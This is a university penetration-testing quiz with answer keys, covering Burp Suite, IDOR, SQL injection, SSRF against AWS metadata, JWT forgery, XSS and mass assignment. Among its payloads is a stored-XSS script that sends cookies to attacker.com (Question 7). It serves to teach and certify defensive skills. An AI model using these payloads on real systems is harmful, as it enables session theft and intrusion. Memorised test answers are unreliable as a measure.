# Quiz: Module 09 — Web Application Penetration Testing

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

**Instructions:** Select the single best answer for each question. Questions are aligned to CompTIA PenTest+ PT0-002 Domain 3: Attacks and Exploits.

---

### Question 1

A penetration tester wants to manually modify HTTP requests sent to a web application and resend each modified version multiple times without browser interference. Which Burp Suite component is most appropriate for this task?

- A) Proxy — to intercept all traffic in real time
- B) Intruder — to automate multiple request iterations
- C) Repeater — to manually resend a single request with modifications
- D) Decoder — to encode and decode request parameters

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** Repeater is designed specifically for the task described — capturing a single HTTP request, modifying specific parameters or headers, resending it, and comparing responses. It is the primary manual testing tool in Burp Suite for exploring parameter behavior, testing injection points, and verifying vulnerabilities.
- **Why A is incorrect:** Proxy intercepts all requests from the browser in real time. It is used to capture and review traffic, but requires browser interaction for each request. It is not designed for iterative manual resending of a single request.
- **Why B is incorrect:** Intruder automates the iteration — it cycles through a payload list automatically. The scenario asks for manual modification and manual resending, which is Repeater's purpose. Intruder would be appropriate if the tester wanted to systematically fuzz the parameter with many values automatically.
- **Why D is incorrect:** Decoder performs encoding and decoding operations (Base64, URL encoding, HTML entities, etc.) on data. It does not send requests to the target application.

---

### Question 2

A web application displays user profiles at the following URL:

```text
https://app.example.com/user/profile?uid=4821
```

A penetration tester logs in as a standard user, notes the `uid` value, changes it to `uid=4822` in Burp Repeater, and receives the profile data of a different user without any error or re-authentication prompt. Which OWASP Top 10 category does this finding fall under?

- A) A03:2021 — Injection
- B) A07:2021 — Identification and Authentication Failures
- C) A01:2021 — Broken Access Control
- D) A02:2021 — Cryptographic Failures

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** This is a classic IDOR (Insecure Direct Object Reference) finding — the application uses a user-controllable parameter (`uid`) to directly reference a database object without verifying that the requesting user is authorized to access that object. IDOR is the primary example under OWASP A01:2021 — Broken Access Control, which moved to the number one position in the 2021 list.
- **Why A is incorrect:** Injection (A03) involves placing code or commands into interpreter inputs — SQL, OS commands, LDAP queries. Changing a numeric ID to access another user's record is an authorization failure, not injection.
- **Why B is incorrect:** Authentication Failures (A07) relate to weaknesses in how users prove their identity — weak passwords, broken session management, insecure credential storage. This user was authenticated; the failure is in authorization (what they are allowed to do after authentication).
- **Why D is incorrect:** Cryptographic Failures (A02) relate to insufficient protection of data in transit or at rest — cleartext transmission, weak encryption algorithms, hardcoded keys. The UID parameter change is not a cryptographic issue.

---

### Question 3

During a web application test, a tester enters `1' OR '1'='1` in a login form's username field and leaves the password field blank. The application logs the tester in as the first user in the database — the administrator account. What vulnerability does this exploit, and what is its OWASP classification?

- A) Stored XSS — OWASP A03:2021; the payload is stored in the database and executes on the next request
- B) SQL Injection in an authentication form — OWASP A03:2021; the input manipulates the SQL query to bypass the password check
- C) SSRF — OWASP A10:2021; the payload causes the server to issue an internal request to the authentication database
- D) IDOR — OWASP A01:2021; the tester directly references the admin account's ID through the username field

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The payload `1' OR '1'='1` is a SQL injection authentication bypass. The input is interpreted by the backend SQL query, which becomes something like `SELECT * FROM users WHERE username = '1' OR '1'='1' AND password = ''`. The `OR '1'='1'` condition is always true, causing the query to return the first user record — often the admin. This is injection (A03) affecting an authentication endpoint.
- **Why A is incorrect:** Stored XSS stores JavaScript payloads in the database for later execution in other users' browsers. The payload `1' OR '1'='1` is SQL syntax, not JavaScript. No script tags, event handlers, or JS functions are present in the payload.
- **Why C is incorrect:** SSRF causes the server to make HTTP requests to internal systems. The login form attack does not cause any server-to-server request. It manipulates a database query, not a URL fetch operation.
- **Why D is incorrect:** IDOR involves directly referencing object identifiers (numeric IDs, GUIDs) to access unauthorized objects. The payload here is SQL injection syntax that manipulates query logic — not a direct object reference attack.

---

### Question 4

A penetration tester discovers that a web application displays product images by fetching them from a URL specified in a request parameter:

```text
GET /image?url=https://cdn.example.com/product123.jpg
```

The tester modifies the request to:

```text
GET /image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The server responds with IAM role credentials including `AccessKeyId`, `SecretAccessKey`, and `Token`. Which vulnerability class does this represent?

- A) XML External Entity (XXE) — the application processes external XML entities through the URL parameter
- B) Server-Side Request Forgery (SSRF) — the application fetches a URL on behalf of the attacker, reaching internal AWS metadata
- C) Reflected XSS — the URL parameter value is reflected in the response and executes as JavaScript
- D) Path Traversal — the attacker uses `../` notation in the URL to traverse to internal directories

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** SSRF occurs when a server-side function makes HTTP requests to an attacker-controlled destination. Here, the `url` parameter causes the application's server to fetch the AWS Instance Metadata Service (IMDS) endpoint `169.254.169.254` — a link-local address accessible only from within the EC2 instance. The attacker cannot reach this address directly; the vulnerable server fetches it on their behalf, returning IAM credentials.
- **Why A is incorrect:** XXE exploits XML parsers that process external entity references embedded in XML input. No XML parsing is involved in this scenario — the vulnerability is in an HTTP fetch function, not an XML parser.
- **Why C is incorrect:** XSS requires the payload to be reflected into an HTML context and executed as JavaScript in a browser. The response here is the raw metadata JSON, not HTML with embedded script execution.
- **Why D is incorrect:** Path traversal uses sequences like `../` to navigate the filesystem outside an intended directory. The payload here targets a network IP address, not a filesystem path. The mechanism is network request manipulation, not directory traversal.

---

### Question 5

A penetration tester is testing a web application and notices that the JWT token in the `Authorization` header has the following header portion when decoded:

```json
{"alg": "HS256", "typ": "JWT"}
```

The tester decodes the payload and sees:

```json
{"user_id": 42, "role": "user"}
```

The tester wants to test whether the application is vulnerable to the JWT "none" algorithm attack. What modification should be tested?

- A) Change `user_id` to `1` and re-sign the JWT with the HS256 algorithm using the key "secret"
- B) Change `alg` to `"none"`, change `role` to `"admin"`, re-encode the header and payload, and send the token with an empty signature
- C) Delete the entire JWT header and send only the payload portion
- D) Change `alg` to `"RS256"` and re-sign with an attacker-generated RSA private key

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The JWT "none" algorithm attack sets the algorithm to `"none"` in the header, modifies the payload (e.g., escalating role to admin), re-encodes both parts in Base64, and sends the token with an empty signature (or just the trailing dot). If the server accepts tokens with `alg: none` without signature verification, the attacker can forge arbitrary claims.
- **Why A is incorrect:** Re-signing with HS256 requires knowledge of the secret key. Without the correct key, the server will reject the signature. This is not the "none" algorithm attack — it would only work if the tester already knew the signing key.
- **Why C is incorrect:** Sending only the payload without a header is not a valid JWT structure. A JWT requires three parts: `header.payload.signature`. Removing the header entirely would cause the server to reject the token as malformed.
- **Why D is incorrect:** The RS256 confusion attack (algorithm confusion) involves a different technique where an HS256 server is tricked into using a public RSA key as an HMAC secret. This is a valid attack, but it is distinct from the "none" algorithm attack described in the question.

---

### Question 6

A tester is using Burp Suite Intruder to perform a credential brute force against a login form. The form has two fields: `username` and `password`. The tester has a list of 100 usernames and a list of 200 passwords. Which Intruder attack type tries every combination of username and password, resulting in 20,000 total requests?

- A) Sniper — iterates through all payloads in a single position
- B) Pitchfork — pairs username list item 1 with password list item 1, item 2 with item 2, etc.
- C) Cluster Bomb — tries all combinations of all payload lists (Cartesian product)
- D) Battering Ram — sends the same payload value in all positions simultaneously

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** Cluster Bomb performs a Cartesian product — it tries every value from list 1 paired with every value from list 2. With 100 usernames and 200 passwords, this produces 100 × 200 = 20,000 requests. This is the correct choice for full credential brute force when no known username-password pairing exists.
- **Why A is incorrect:** Sniper uses a single payload list against a single marked position at a time. With two positions (username and password), it would test each payload value in position 1 first, then each in position 2 — but not as combinations. Total requests = 100 + 200 = 300.
- **Why B is incorrect:** Pitchfork runs multiple payload lists in parallel — list item 1 goes to position 1 AND position 2 simultaneously. It pairs items by index, stopping when the shorter list is exhausted. With 100 and 200 items, it would produce 100 requests (limited by the shorter list). This is used for known username-password pairs from credential leaks.
- **Why D is incorrect:** Battering Ram sends the same single payload to all marked positions simultaneously. It uses one payload list and puts each value in every position at the same time. It cannot test different values in different positions, making it unsuitable for username-password brute forcing.

---

### Question 7

A penetration tester identifies that a web application reflects user input in the response without encoding. The tester submits the following payload in a comment field:

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

Other users who view the comment page have their session cookies sent to the attacker's server. Which XSS type is this, and why is it more dangerous than reflected XSS?

- A) DOM-based XSS; it is more dangerous because it modifies the browser DOM without server involvement
- B) Stored XSS; it is more dangerous because the payload persists in the database and executes for every user who views the affected page without requiring them to click a crafted link
- C) Reflected XSS; it is more dangerous because the payload travels through the server response on each request
- D) Blind XSS; it is more dangerous because the attacker cannot see the execution in their own browser

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Stored XSS (also called persistent XSS) stores the payload in the application's database and serves it to every user who loads the page containing the malicious comment. No social engineering or crafted link is required — any authenticated user who visits the comment page becomes a victim. This makes it significantly more impactful than reflected XSS, which requires each victim to click a specially crafted link.
- **Why A is incorrect:** DOM-based XSS occurs when JavaScript in the page reads attacker-controlled data from the DOM (URL fragment, document.referrer, etc.) and writes it to an executable sink without server-side involvement. The scenario describes a server-stored payload, not DOM manipulation.
- **Why C is incorrect:** Reflected XSS is the type where the payload is included in the server's immediate response to a request containing the payload — typically via a URL. It requires the victim to click the crafted URL. The scenario describes stored XSS, not reflected.
- **Why D is incorrect:** Blind XSS is a variant of stored XSS where the payload executes in an internal context the attacker cannot directly observe (admin panel, log viewer). While this scenario does describe stored XSS, the more precise and complete answer is Option B, which correctly identifies stored XSS and explains the persistence-based reason for greater danger.

---

### Question 8

A penetration tester is performing a union-based SQL injection against a web application and discovers the query uses 3 columns. They want to extract the database version. The first and third columns are used for display; the second column position is injectable. Which payload correctly extracts the database version string?

- A) `1 UNION SELECT version(), null, null--`
- B) `1 UNION SELECT null, @@version, null--`
- C) `1 UNION SELECT null, null, version()--`
- D) `1 UNION SELECT null, null, null WHERE version()--`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The tester established that the second column position is injectable and displayed. `UNION SELECT null, @@version, null--` places the version string (`@@version` in MySQL/MSSQL) in the second column position, where it will appear in the application's output. `null` fills the other two column positions to maintain the required 3-column count.
- **Why A is incorrect:** This places `version()` in the first column position, not the second. Since the tester determined the second column is the injectable/displayed position, results in the first column may not be visible in the output.
- **Why C is incorrect:** This places `version()` in the third column position, not the second. The same reasoning applies — the third column may not be displayed.
- **Why D is incorrect:** `WHERE version()` is syntactically incorrect SQL. `WHERE` requires a conditional expression that evaluates to true/false, not a function call used as a filter condition. This query would produce a SQL error.

---

### Question 9

Which of the following is the correct description of the difference between a reflected XSS attack and a stored XSS attack in terms of delivery mechanism?

- A) Reflected XSS is delivered through a database injection; stored XSS is delivered through HTTP headers
- B) Reflected XSS requires the victim to request a URL containing the payload, which is echoed back in the response; stored XSS persists in the application and executes when any user loads the affected page
- C) Reflected XSS executes only in the attacker's browser; stored XSS executes only in the administrator's browser
- D) Reflected XSS requires JavaScript to be enabled in the victim's browser; stored XSS executes regardless of JavaScript settings

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** This is the precise technical distinction. Reflected XSS: the payload is part of the HTTP request (usually in a URL parameter) and is echoed back in the immediate response — the victim must be induced to make that specific request, typically by clicking a crafted link. Stored XSS: the payload is written to the server's data store (database, log file, user comment) and served to all subsequent users who load the affected content.
- **Why A is incorrect:** Reflected XSS is delivered through URL parameters or form inputs — not database injection. Stored XSS does involve database storage, but the delivery to victims is through normal page loading, not HTTP headers.
- **Why C is incorrect:** Reflected XSS executes in the victim's browser when they click the crafted link — not the attacker's browser. Stored XSS executes in any user's browser who loads the affected page, which may include admins but is not limited to them.
- **Why D is incorrect:** Both reflected and stored XSS require JavaScript to be enabled to execute `<script>` payloads. However, event-handler-based XSS (like `onerror=`) may execute without script blocks. The JavaScript requirement is the same for both types and is not the distinguishing factor.

---

### Question 10

A web application has an API endpoint at `/api/v1/user/settings` that returns and updates user settings. A penetration tester discovers that sending the following JSON body to the endpoint creates an unexpected account with admin privileges:

```json
{"name": "Test User", "email": "test@example.com", "role": "admin", "active": true}
```

The tester's original account is a standard user without admin rights. The API accepted the `role` field and assigned it. Which vulnerability does this represent?

- A) SQL Injection — the `role` field contains a SQL payload that modifies the database directly
- B) Mass Assignment — the API applies all submitted JSON properties including `role`, which should not be user-controllable
- C) Broken Authentication — the API does not properly verify the user's identity before processing the request
- D) SSRF — the `role` field causes the server to make a request to an internal authorization service

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Mass Assignment (also called Auto-Binding) occurs when an API or framework automatically maps all properties from user-supplied input directly onto an object model or database record — including properties that should be read-only or system-controlled. A user should never be able to set their own `role` — this field should be ignored or rejected when it comes from user input. Mass Assignment is classified under OWASP API Security Top 10 as API6:2019 and relates to A04:2021 (Insecure Design) in the web Top 10.
- **Why A is incorrect:** The `role` field contains a plain string value `"admin"` — not SQL syntax. No SQL injection indicators are present. The attack works because the API applies the property, not because a query was manipulated.
- **Why C is incorrect:** Broken Authentication relates to how the user proves their identity. The tester is authenticated as a valid user — the issue is what the authenticated user is permitted to do (authorization), not whether authentication works.
- **Why D is incorrect:** SSRF causes the server to make outbound HTTP requests to attacker-controlled destinations. Submitting a JSON role value does not trigger any server-to-server HTTP request. The vulnerability is in object property binding, not URL fetching.

---

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
